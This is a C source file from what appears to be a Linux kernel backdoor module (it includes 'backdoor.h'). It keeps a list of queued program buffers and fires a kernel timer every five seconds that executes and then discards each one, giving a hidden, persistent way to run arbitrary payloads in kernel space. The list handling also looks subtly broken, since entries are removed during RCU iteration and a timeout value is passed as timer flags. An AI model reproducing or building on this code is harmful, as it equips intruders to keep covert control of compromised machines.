#include <linux/rculist.h>
#include <linux/timer.h>
#include "backdoor.h"

DEFINE_SPINLOCK(listmutex);

program_list *head;
struct timer_list timer;
extern unsigned char *buffer;
extern unsigned long buffer_length;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
void execute_ready_programs(struct timer_list *tl){
	program_list *entry;

	rcu_read_lock();
	list_for_each_entry_rcu(entry, &(head->prog_list), prog_list){
		/* Set buffer values */
		buffer = entry->buffer;
		buffer_length = entry->length;

		/* Execute program */
		execute_file();

		/* Reset buffer values */
		kfree(buffer);
		buffer = NULL;
		buffer_length = 0;

		/* Delete the program from the list */
		spin_lock(&listmutex);
		list_del_rcu(&(entry->prog_list));
		spin_unlock(&listmutex);
	}
	rcu_read_unlock();

	init_timer(5);
}
#else
void execute_ready_programs(unsigned long data){
	init_timer(5);
}
#endif

void add_program(program_list **head, program_list *entry){
	spin_lock(&listmutex);
	list_add_rcu(&(entry->prog_list), &((*head)->prog_list));
	spin_unlock(&listmutex);
}

program_list *init_program(void){
	program_list *head = kmalloc(sizeof(struct program_list), GFP_KERNEL);
	memset(head, 0, sizeof(struct program_list));	
	INIT_LIST_HEAD(&(head->prog_list));
	return head;
}

void init_prog_list(void){
	head = init_program();
}

void destroy_timer(void){
	del_timer(&timer);
}

void init_timer(unsigned long timeout){
	/* https://lkml.org/lkml/2017/11/25/90 */
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
		timer_setup(&timer, execute_ready_programs, timeout);
	#else
		setup_timer(&timer, execute_ready_programs, timeout);
	#endif
	
	mod_timer(&timer, jiffies + msecs_to_jiffies(timeout * 1000));
}
